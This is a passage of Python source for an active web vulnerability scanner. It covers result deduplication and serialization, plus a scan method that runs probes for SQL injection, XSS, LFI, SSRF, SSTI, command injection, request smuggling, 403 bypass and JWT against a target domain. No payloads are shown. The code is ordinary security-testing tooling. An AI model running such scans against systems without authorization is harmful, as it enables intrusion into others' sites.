    return sorted(unique, key=lambda f: _SEVERITY_ORDER.get(f.severity, 99))


def _serialize(findings: List[VulnFinding]) -> List[Dict[str, Any]]:
    return [
        {
            "vuln_type": f.vuln_type,
            "severity": f.severity,
            "url": f.url,
            "parameter": f.parameter,
            "payload": f.payload,
            "evidence": f.evidence,
            "confidence": f.confidence,
            "cwe": f.cwe,
            "cvss": f.cvss,
        }
        for f in findings
    ]


# ---------------------------------------------------------------------------
# Public API — called from app.py
# ---------------------------------------------------------------------------

class WebVulnScanner:
    """
    Active web vulnerability scanner.

    Usage in app.py:
        scanner = WebVulnScanner(target_url=f"https://{domain}")
        results = scanner.scan(domain)
        scan_results[scan_id]['web_vuln'] = results
    """

    def __init__(self, target_url: str, proxy: Optional[str] = None,
                 max_workers: int = 8):
        self.target_url = target_url.rstrip("/")
        self.proxy = proxy
        self.max_workers = max_workers

    def scan(self, domain: str) -> Dict[str, Any]:
        session = _build_session(self.proxy)
        # Suppress SSL warnings — scanning includes self-signed targets
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        state = ScanState(target_url=self.target_url, domain=domain)

        # --- Discovery phases (sequential, each feeds the next) ---
        _discover_endpoints(session, state)
        _build_baseline(session, state)
        _discover_parameters(session, state)

        # --- Vulnerability scan phases (parallel) ---
        scan_phases = [
            _sqli_scan,
            _xss_scan,
            _lfi_scan,
            _ssrf_scan,
            _ssti_scan,
            _cmd_inject_scan,
            _open_redirect_scan,
            _cors_scan,
            _info_disclosure_scan,
            _smuggling_probe,
            _bypass_403_scan,
            _jwt_probe,
            _header_audit,
        ]

        all_findings: List[VulnFinding] = []
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {ex.submit(phase, session, state): phase.__name__
                       for phase in scan_phases}
            for f in as_completed(futures):
                try:
                    all_findings.extend(f.result())
                except Exception as exc:
                    print(f"[web_vuln] phase {futures[f]} raised: {exc}")

        all_findings = _dedup_sort(all_findings)

        summary = {sev: 0 for sev in _SEVERITY_ORDER}
        for f in all_findings:
            summary[f.severity] = summary.get(f.severity, 0) + 1

        return {
            "target": self.target_url,
            "domain": domain,
            "endpoints_discovered": len(state.discovered_endpoints),
            "parameters_discovered": sum(len(v) for v in state.discovered_params.values()),
            "total_findings": len(all_findings),
            "severity_summary": summary,
            "findings": _serialize(all_findings),
        }